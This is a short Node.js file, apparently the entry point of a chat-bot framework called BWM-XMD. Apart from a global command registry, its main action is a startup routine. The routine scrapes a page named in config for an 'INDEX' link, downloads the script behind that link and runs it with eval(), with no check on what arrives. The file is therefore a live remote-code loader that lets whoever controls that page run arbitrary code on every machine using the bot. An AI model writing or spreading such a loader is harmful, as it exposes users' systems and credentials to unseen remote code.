
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Aslam Dullah                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const dullaConfig = require("./config");

// Global command registry for the bot framework
global.commands = global.commands || [];


global.dullah = function(options, handler) {
  if (typeof options === 'object' && typeof handler === 'function') {
    global.commands.push({ options, handler });
    return true;
  }
  return dullaConfig;
};

// Also expose config properties on global.dullah
Object.keys(dullaConfig).forEach(key => {
  if (typeof dullaConfig[key] !== 'function') {
    Object.defineProperty(global.dullah, key, {
      get: function() { return dullaConfig[key]; },
      enumerable: true
    });
  }
});

// Local reference
const dullah = global.dullah;

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(dullaConfig.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    const dullah = global.dullah;
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchINDEXUrl();
